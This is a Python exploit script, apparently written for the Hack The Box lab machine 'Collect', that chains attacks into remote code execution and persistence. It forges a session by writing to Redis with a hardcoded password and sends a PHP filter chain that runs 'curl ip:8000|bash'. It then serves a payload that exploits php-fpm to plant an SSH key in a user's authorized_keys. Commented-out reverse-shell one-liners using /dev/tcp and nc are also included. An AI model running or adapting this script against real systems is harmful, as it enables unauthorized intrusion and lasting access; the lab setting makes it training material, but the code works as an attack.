#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-02
Description:

Usage: python script.py
"""

import requests
import os
import netifaces as ni
import threading
import http.server
import socketserver
import redis

# Get hackthebox vpn ip from tun0 interface
try:
    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}
session.headers = {"Authorization": "Basic ZGV2ZWxvcGVyc19ncm91cDpyMGNrZXQ="}
host = "http://developers.collect.htb"

# function for creating php filter chain using synacktiv "php_filter_chain_generator.py" script from github
def gen_php_chain(ip):
    command = f'curl -s https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py | python - --chain \'<?= `curl {ip}:8000|bash` ;?>\''
    output_file = os.popen(command)
    output = output_file.read()
    output_file.close()
    php_chain = output.split('\n')[1]
    return php_chain

# hosting reverse shell on a python simple http server
def start_http_server(port, ip):

    # "www-data" shell
    #shell = f'/bin/sh -i >& /dev/tcp/{ip}/4141 0>&1'

    # Get direct shell as user "victor" by exploiting php-fpm from "www-data" shell
    # cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} 4141 >/tmp/f'
    cmd = 'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN3AYlujWz8DVYtSkVPFdbnFnb9AcIEXf6HycsZX2asy >> /home/victor/.ssh/authorized_keys;chmod 600 /home/victor/.ssh/authorized_keys'
    shell = f"curl -s http://{ip}:8000/fpm.py | python3 - 127.0.0.1 /var/www/collect/public/index.php -c \"<?php echo system('{cmd}'); exit; ?>\""

    with open('index.html', 'w') as f:
        f.write(shell)

    try:
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", port), Handler)

        print("[+] Serving at port", port)
        httpd.serve_forever()
    except OSError as e:
        print(e)

def developers_auth(url):

    get_sess = session.get(url)
    sess_token = session.cookies.get('PHPSESSID')
    print("[+] New session token:", sess_token)

    redis_client = redis.Redis(host='10.10.11.192', port=6379, password='COLLECTR3D1SPASS')
    keys = redis_client.keys('*')

    for key in keys:
        if sess_token in key.decode():
            is_ok = redis_client.set(key, "auth|s:4:\"true\";")
            if is_ok:
                return True
            else:
                return False


if __name__ == "__main__":
    try:
        # Start http server on child thread
        port = 8000
        http_thread = threading.Thread(target=start_http_server, args=(port,tun0_ip))
        http_thread.daemon = True
        http_thread.start()
        
        # Generate php chain
        rce_chain = gen_php_chain(tun0_ip)
        is_auth = developers_auth(url=host)

        if is_auth:
            session.get(f"{host}/?page={rce_chain}", timeout=10)
        else:
            print("[-] developers auth error!")

    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
    finally:
        if os.path.isfile("index.html"): os.remove("index.html")
